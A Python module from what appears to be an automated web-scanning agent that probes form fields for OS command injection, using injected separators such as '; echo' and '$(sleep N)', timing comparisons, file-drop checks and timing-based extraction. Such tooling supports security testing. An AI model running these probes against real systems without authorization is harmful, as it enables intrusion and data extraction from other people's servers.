from __future__ import annotations

from ravage.agent_core.agent_state import AgentState
from ravage.web_core.http_probe import ProbeResponse, ProbeSession, compare_responses, form_defaults
from ravage.probe_suite_parts.command.command_payloads import (
    _COMMAND_TIMING_DELAY_SECONDS,
    _COMMAND_TIMING_EXTRACTION_BUDGET,
    _command_file_drop_payloads,
    _command_proof_payloads,
    _command_timing_payload_pairs,
    _command_url_validator_file_drop_payloads,
    _ognl_payload_variants,
)
from ravage.probe_suite_parts.command.command_sessions import _short_command_session
from ravage.probe_suite_parts.command.command_signals import _command_timing_signal, _has_command_proof, command_payload_signal
from ravage.probe_suite_parts.command.command_targets import _command_target_filter
from ravage.probe_suite_parts.command.command_timing import _command_timing_extraction
from ravage.probe_suite_parts.general import safe_get, submit_form
from ravage.probe_suite_parts.support import (
    _contains_word,
    _contains_word_in_list,
    _form_brief,
    _form_input_names,
    _form_targets,
    _form_text,
    _string_items,
)
from ravage.web_core.proof_recognizer import recognize_proofs


def _probe_command_forms(
    session: ProbeSession,
    state: AgentState,
    marker: str,
    payloads: dict[str, str],
    proof_budget: int,
    *,
    fast: bool = False,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    forms = _form_targets(state, limit=12)
    forms.sort(key=_command_form_sort_key)
    active_session = session
    if fast:
        active_session = _short_command_session(session)
    for form in forms:
        for input_field in _form_input_names(form):
            action = str(form.get("action") or session.target_url)
            synthetic: dict[str, object] = {
                "name": input_field,
                "url": action,
                "sources": ["form"],
                "hints": [*_string_items(form.get("categories")), *_string_items(form.get("hints"))],
                "context": repr(_form_brief(form)),
            }
            if not _command_target_filter(synthetic):
                continue
            baseline = submit_form(active_session, form, form_defaults(form))
            requests.append(
                baseline.summary(body_chars=100)
                | {"probe_kind": "command_form_baseline", "field": input_field}
            )
            for payload, expected in _command_form_signal_payloads(payloads, marker=marker, fast=fast):
                fields = form_defaults(form, marker_name=input_field, marker=payload)
                response = submit_form(active_session, form, fields)
                requests.append(
                    response.summary(body_chars=180)
                    | {"probe_kind": "command_form_signal", "field": input_field}
                )
                delta = compare_responses(baseline, response, marker=payload)
                if not command_payload_signal(response, expected, payload, delta):
                    continue
                form_brief = _form_brief(form)
                findings.append(
                    {
                        "type": "command_boundary_signal",
                        "form": form_brief,
                        "input": input_field,
                        "payload": payload,
                        "expected": expected,
                        "delta": delta.to_json(),
                        "response": response.summary(body_chars=220),
                    }
                )
                proof_findings, proof_requests, proof_budget = _probe_command_form_proofs(
                    active_session,
                    form,
                    input_field,
                    payload,
                    marker,
                    proof_budget,
                )
                findings.extend(proof_findings)
                requests.extend(proof_requests)
                break
            if not fast and not _has_command_proof(findings) and proof_budget > 0:
                timing_findings, timing_requests, proof_budget = _probe_command_form_timing(
                    active_session,
                    form,
                    input_field,
                    marker,
                    payloads,
                    proof_budget,
                )
                findings.extend(timing_findings)
                requests.extend(timing_requests)
            if _has_command_proof(findings) or proof_budget <= 0:
                break
        if _has_command_proof(findings) or proof_budget <= 0:
            break
    return findings, requests, proof_budget

def _probe_command_url_validator_forms(
    session: ProbeSession,
    state: AgentState,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    forms = _form_targets(state, limit=12)
    forms.sort(key=_command_form_sort_key)
    for form in forms:
        if budget <= 0 or _has_command_proof(findings):
            break
        for input_field in _form_input_names(form):
            if not _url_validator_input(form, input_field):
                continue
            baseline_fields = form_defaults(form, marker_name=input_field, marker="http://example.com")
            baseline = submit_form(session, form, baseline_fields)
            requests.append(
                baseline.summary(body_chars=180)
                | {"probe_kind": "command_url_validator_baseline", "field": input_field}
            )
            timing_payload = f"http://example.com$(sleep {_COMMAND_TIMING_DELAY_SECONDS})"
            timing_fields = form_defaults(form, marker_name=input_field, marker=timing_payload)
            timed = submit_form(session, form, timing_fields)
            requests.append(
                timed.summary(body_chars=220)
                | {"probe_kind": "command_url_validator_timing", "field": input_field}
            )
            if not _command_timing_signal(baseline, timed):
                continue
            findings.append(
                {
                    "type": "command_boundary_timing_signal",
                    "form": _form_brief(form),
                    "input": input_field,
                    "payload": timing_payload,
                    "control_payload": "http://example.com",
                    "elapsed_delta_ms": timed.elapsed_ms - baseline.elapsed_ms,
                    "response": timed.summary(body_chars=260),
                }
            )
            proof_findings, proof_requests, budget = _probe_command_url_validator_file_drop(
                session,
                form,
                input_field,
                marker,
                budget,
            )
            findings.extend(proof_findings)
            requests.extend(proof_requests)
            break
    return findings, requests, budget

def _probe_command_url_validator_file_drop(
    session: ProbeSession,
    form: dict[str, object],
    input_field: str,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    form_brief = _form_brief(form)
    for payload, fetch_paths in _command_url_validator_file_drop_payloads(marker):
        if budget <= 0:
            break
        budget -= 1
        fields = form_defaults(form, marker_name=input_field, marker=payload)
        response = submit_form(session, form, fields)
        requests.append(
            response.summary(body_chars=260)
            | {"probe_kind": "command_url_validator_file_drop_write", "field": input_field}
        )
        for fetch_path in fetch_paths:
            fetched = safe_get(session, session.absolute(fetch_path))
            requests.append(
                fetched.summary(body_chars=360)
                | {"probe_kind": "command_url_validator_file_drop_fetch", "field": input_field}
            )
            proofs = recognize_proofs(fetched.body)
            if not proofs:
                continue
            findings.append(
                {
                    "type": "command_boundary_proof",
                    "form": form_brief,
                    "input": input_field,
                    "payload": payload,
                    "proofs": proofs[:5],
                    "probe_kind": "url_validator_file_drop",
                    "replay": {
                        "method": str(form.get("method") or "GET").upper(),
                        "url": str(form.get("action") or session.target_url),
                        "fields": _form_replay_fields(fields, input_field),
                        "fetch_url": session.absolute(fetch_path),
                    },
                    "response": fetched.summary(body_chars=700),
                }
            )
            return findings, requests, budget
    return findings, requests, budget

def _url_validator_input(form: dict[str, object], input_field: str) -> bool:
    name = input_field.lower()
    if name not in {"url", "uri", "endpoint", "target", "site", "website", "link", "address"}:
        return False
    text = " ".join(
        [
            str(form.get("action") or ""),
            _form_text(form),
            " ".join(_string_items(form.get("categories"))),
            " ".join(_string_items(form.get("hints"))),
        ]
    ).lower()
    return _contains_word(
        text,
        ("url", "site", "website", "link", "fetch", "request", "check", "validate", "save", "availability"),
    )

def _command_form_signal_payloads(payloads: dict[str, str], *, marker: str, fast: bool) -> list[tuple[str, str]]:
    if not fast:
        return list(payloads.items())
    ordered: list[tuple[str, str]] = []
    for payload in _ognl_payload_variants(f"echo {marker}"):
        ordered.append((payload, marker))
    preferred = ("; echo", "&& echo", "|echo", "%0aecho", "$(echo", "`echo")
    for needle in preferred:
        for payload, expected in payloads.items():
            if needle in payload.lower() and (payload, expected) not in ordered:
                ordered.append((payload, expected))
    for payload, expected in payloads.items():
        if (payload, expected) not in ordered:
            ordered.append((payload, expected))
    return ordered[:5]

def _command_form_sort_key(form: dict[str, object]) -> tuple[int, str]:
    hints = " ".join([*_string_items(form.get("categories")), *_string_items(form.get("hints"))]).lower()
    action = str(form.get("action") or "").lower()
    priority = 0
    if "command_boundary" in hints:
        priority += 80
    if _contains_word(action, ("sendmessage", "action", "exec", "command", "cmd", "script", "health", "status")):
        priority += 24
    if _contains_word(hints, ("content", "structured_input")):
        priority += 8
    return (-priority, action)

def _has_command_tagged_form(state: AgentState) -> bool:
    for form in _form_targets(state, limit=20):
        hints = [*_string_items(form.get("categories")), *_string_items(form.get("hints"))]
        if _contains_word_in_list(hints, ("command_boundary",)):
            return True
    return False

def _probe_command_form_timing(
    session: ProbeSession,
    form: dict[str, object],
    input_field: str,
    marker: str,
    payloads: dict[str, str],
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    form_brief = _form_brief(form)
    for control_payload, timing_payload in _command_timing_payload_pairs(payloads, marker):
        control_fields = form_defaults(form, marker_name=input_field, marker=control_payload)
        timing_fields = form_defaults(form, marker_name=input_field, marker=timing_payload)
        control = submit_form(session, form, control_fields)
        timed = submit_form(session, form, timing_fields)
        requests.append(control.summary(body_chars=180) | {"probe_kind": "command_boundary_timing_control"})
        requests.append(timed.summary(body_chars=180) | {"probe_kind": "command_boundary_timing"})
        if not _command_timing_signal(control, timed):
            continue
        replay_fields = _form_replay_fields(timing_fields, input_field)
        findings.append(
            {
                "type": "command_boundary_timing_signal",
                "form": form_brief,
                "input": input_field,
                "payload": timing_payload,
                "control_payload": control_payload,
                "elapsed_delta_ms": timed.elapsed_ms - control.elapsed_ms,
                "replay": {
                    "method": str(form.get("method") or "GET").upper(),
                    "url": str(form.get("action") or session.target_url),
                    "fields": replay_fields,
                },
                "control_response": control.summary(body_chars=220),
                "response": timed.summary(body_chars=220),
            }
        )
        if not _has_command_proof(findings) and budget > 0:
            proof_findings, proof_requests, budget = _probe_command_form_proofs(
                session,
                form,
                input_field,
                timing_payload,
                marker,
                budget,
            )
            findings.extend(proof_findings)
            requests.extend(proof_requests)
        if not _has_command_proof(findings):
            def send_form_payload(payload: str) -> ProbeResponse:
                fields = form_defaults(form, marker_name=input_field, marker=payload)
                return submit_form(session, form, fields)

            extract_findings, extract_requests, _extract_budget = _command_timing_extraction(
                send_payload=send_form_payload,
                timing_payload=timing_payload,
                marker=marker,
                baseline_ms=control.elapsed_ms,
                target_brief={"form": form_brief, "input": input_field},
                budget=max(budget, _COMMAND_TIMING_EXTRACTION_BUDGET),
            )
            findings.extend(extract_findings)
            requests.extend(extract_requests)
        break
    return findings, requests, budget

def _probe_command_form_proofs(
    session: ProbeSession,
    form: dict[str, object],
    input_field: str,
    signal_payload: str,
    marker: str,
    budget: int,
) -> tuple[list[dict[str, object]], list[dict[str, object]], int]:
    findings: list[dict[str, object]] = []
    requests: list[dict[str, object]] = []
    form_brief = _form_brief(form)
    for payload in _command_proof_payloads(signal_payload, marker):
        if budget <= 0:
            break
        budget -= 1
        fields = form_defaults(form, marker_name=input_field, marker=payload)
        response = submit_form(session, form, fields)
        requests.append(response.summary(body_chars=260) | {"probe_kind": "command_boundary_proof"})
        proofs = recognize_proofs(response.body)
        if proofs:
            replay_fields = _form_replay_fields(fields, input_field)
            findings.append(
                {
                    "type": "command_boundary_proof",
                    "form": form_brief,
                    "input": input_field,
                    "payload": payload,
                    "proofs": proofs[:5],
                    "replay": {
                        "method": str(form.get("method") or "GET").upper(),
                        "url": str(form.get("action") or session.target_url),
                        "fields": replay_fields,
                    },
                    "response": response.summary(body_chars=520),
                }
            )
            break
    if findings:
        return findings, requests, budget
    for payload, fetch_paths in _command_file_drop_payloads(signal_payload, marker):
        if budget <= 0:
            break
        budget -= 1
        fields = form_defaults(form, marker_name=input_field, marker=payload)
        response = submit_form(session, form, fields)
        requests.append(response.summary(body_chars=220) | {"probe_kind": "command_boundary_file_drop_write"})
        for fetch_path in fetch_paths:
            fetched = safe_get(session, session.absolute(fetch_path))
            requests.append(fetched.summary(body_chars=260) | {"probe_kind": "command_boundary_file_drop_fetch"})
            proofs = recognize_proofs(fetched.body)
            if not proofs:
                continue
            replay_fields = _form_replay_fields(fields, input_field)
            findings.append(
                {
                    "type": "command_boundary_proof",
                    "form": form_brief,
                    "input": input_field,
                    "payload": payload,
                    "proofs": proofs[:5],
                    "probe_kind": "file_drop",
                    "replay": {
                        "method": str(form.get("method") or "GET").upper(),
                        "url": str(form.get("action") or session.target_url),
                        "fields": replay_fields,
                        "fetch_url": session.absolute(fetch_path),
                    },
                    "response": fetched.summary(body_chars=520),
                }
            )
            break
        if findings:
            break
    return findings, requests, budget

def _form_replay_fields(fields: dict[str, str], payload_field: str) -> dict[str, str]:
    replay_fields: dict[str, str] = {}
    for name, value in fields.items():
        if name == payload_field:
            replay_fields[name] = "PAYLOAD"
            continue
        replay_fields[name] = value
    return replay_fields
